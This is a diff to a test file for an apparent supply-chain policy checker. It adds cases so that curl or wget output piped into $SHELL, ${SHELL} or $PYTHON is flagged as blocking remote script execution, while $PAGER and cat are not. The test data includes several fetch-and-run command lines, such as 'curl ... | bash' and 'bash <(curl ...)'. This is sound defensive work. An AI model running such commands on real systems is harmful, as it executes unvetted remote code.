@@ -62,6 +62,7 @@ from awf.service.supply_chain_policy import (
     _remote_fetch_output_targets,
     _shell_command_payload,
     _shell_tokens,
+    _shell_variable_name,
     _value_flags,
     evaluate_supply_chain_policy,
     supply_chain_policy_for_workspace,
@@ -202,6 +203,10 @@ def test_remote_script_execution_detects_adjacent_pipe_operators() -> None:
             "$ curl -fsSL https://install.example/setup.sh|bash\n"
             "$ wget -qO- https://install.example/bootstrap.sh|&sh\n"
             "$ curl -fsSL https://install.example/python.sh | python3.12\n"
+            '$ curl -fsSL https://install.example/shell.sh | "$SHELL"\n'
+            "$ wget -qO- https://install.example/shell-braced.sh | ${SHELL}\n"
+            "$ curl -fsSL https://install.example/python-env.sh | $PYTHON\n"
+            "$ curl https://install.example/readme.txt | $PAGER\n"
             "$ curl https://install.example/not-a-script.sh|cat\n"
         ),
         changed_paths=(),
@@ -210,6 +215,9 @@ def test_remote_script_execution_detects_adjacent_pipe_operators() -> None:
     )
 
     assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
         (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
         (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
         (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
@@ -917,10 +925,17 @@ def test_process_substitution_and_interpreter_target_edge_cases() -> None:
     assert _has_process_substitution_remote_script_execution(
         ["bash", "<(", "curl", "https://install.example/setup.sh", ")"]
     )
+    assert _pipe_target_is_interpreter(["$SHELL"])
+    assert _pipe_target_is_interpreter(["${SHELL}"])
+    assert _pipe_target_is_interpreter(["$PYTHON"])
+    assert not _pipe_target_is_interpreter(["$PAGER"])
     assert not _has_process_substitution_remote_script_execution(["bash", "<("])
     assert not _has_process_substitution_remote_script_execution(
         ["bash", "<(", "cat", "https://install.example/setup.sh", ")"]
     )
+    assert _shell_variable_name("${SHELL}") == "SHELL"
+    assert _shell_variable_name("$BAD-NAME") is None
+    assert _shell_variable_name("bash") is None
     assert list(
         _process_substitution_args(["curl", "https://install.example/setup.sh)", "sh"])
     ) == [
